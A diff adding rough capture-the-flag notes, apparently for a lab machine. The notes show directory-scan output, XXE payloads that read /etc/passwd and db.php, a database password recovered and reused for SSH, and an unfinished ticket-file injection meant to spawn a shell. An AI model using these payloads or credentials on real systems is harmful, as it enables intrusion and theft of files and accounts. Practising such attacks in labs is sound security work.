@@ -1,0 +1,144 @@
+in the main page source, this note was found:
+<!-- To configure the contact form email address, go to mail/contact_me.php and update the email address in the PHP file on line 19.-->
+
+On submit of data on the log_submit.php page, bountySubmit() is being called, which seems to be imported from bountylog.js
+
+found in Readme:
+Tasks:
+
+[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
+[X] Write tracker submit script
+[ ] Connect tracker submit script to the database
+[X] Fix developer group permissions
+
+When the application information is being passed to this db file, it looks like it is encoding everything in base64 with the btoa() js function.
+
+/.htaccess            (Status: 403) [Size: 277]
+/.htpasswd.html       (Status: 403) [Size: 277]
+/.htaccess.php        (Status: 403) [Size: 277]
+/.htpasswd            (Status: 403) [Size: 277]
+/.htaccess.html       (Status: 403) [Size: 277]
+/.htpasswd.php        (Status: 403) [Size: 277]
+/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
+/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]   
+/db.php               (Status: 200) [Size: 0]                                    
+/index.php            (Status: 200) [Size: 25169]                                
+/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]    
+/portal.php           (Status: 200) [Size: 125]                                  
+/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
+/server-status        (Status: 403) [Size: 277]                                     
+                                                                  
+
+maybe xxe injection?
+
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
+	<bugreport>
+		<title>&xxe;</title>
+		<cwe>a</cwe>
+		<cvss>a</cvss>
+		<reward>a</reward>
+	</bugreport>
+	
+---------works-----------
+
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE replace [<!ENTITY example "Test"> ]>
+	<bugreport>
+		<title>&example;</title>
+		<cwe>a</cwe>
+		<cvss>a</cvss>
+		<reward>a</reward>
+	</bugreport>
+***
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+	<bugreport>
+		<title>&xxe;</title>
+		<cwe>a</cwe>
+		<cvss>a</cvss>
+		<reward>a</reward>
+	</bugreport>
+
+-> The above script got the passwd file, looks like user(s) are:
+
+development
+
+***
+<?php
+// TODO -> Implement login system with the database.
+$dbserver = "localhost";
+$dbname = "bounty";
+$dbusername = "admin";
+$dbpassword = "m19RoAU0hP41A1sTsq6K";
+$testuser = "test";
+
+-> the above script got this info
+
+And using both we can SSH into the box with the password above and the username found with the other script
+
+
+Python file reversing:
+
+need to execute this:
+python -c 'import os; os.system("/bin/sh")'
+
+1.) file needs to end with: .md
+2.) file needs to start with: # Skytrain Inc
+3.) second line is: ## Ticket to 
+
+
+
+
+# Skytrain Inc
+## Ticket to p
+__Ticket Code:__
+**28+import os; os.system("/bin/sh")
+
+
+yea i didnt get past this...
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
